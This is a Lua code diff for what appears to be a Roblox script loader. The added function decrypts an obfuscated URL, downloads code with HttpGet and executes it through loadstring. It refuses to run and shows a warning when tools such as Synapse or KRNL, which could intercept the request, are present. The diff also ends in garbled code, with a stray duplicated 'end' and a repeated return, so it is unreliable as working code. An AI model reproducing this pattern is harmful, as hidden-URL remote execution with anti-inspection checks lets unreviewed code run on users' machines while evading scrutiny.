@@ -14,9 +14,10 @@ local MAP = {
 
 local function detectHook()
     local env = getfenv()
-    return rawget(env, "syn")
-        or rawget(env, "http_request")
-        or rawget(env, "request")
+    if rawget(env, "syn") then return true end
+    if rawget(env, "KRNL_LOADED") then return true end
+    if rawget(env, "is_synapse_function") then return true end
+    return false
 end
 
 local function warnUI()
@@ -35,6 +36,37 @@ local function decrypt(s)
         local c = s:sub(i, i)
         out[#out + 1] = MAP[c] or c
     end
+    return table.concat(out)
+end
+
+return function(enc)
+    if detectHook() then
+        warnUI()
+        return false
+    end
+
+    local url = decrypt(enc)
+
+    local ok1, src = pcall(game.HttpGet, game, url)
+    if not ok1 then
+        warn("HttpGet failed:", src)
+        return false
+    end
+
+    local func, err = loadstring(src)
+    if not func then
+        warn("loadstring error:", err)
+        return false
+    end
+
+    local ok2, res = pcall(func)
+    if not ok2 then
+        warn("runtime error:", res)
+        return false
+    end
+
+    return true
+end    end
     return table.concat(out)
 end
 
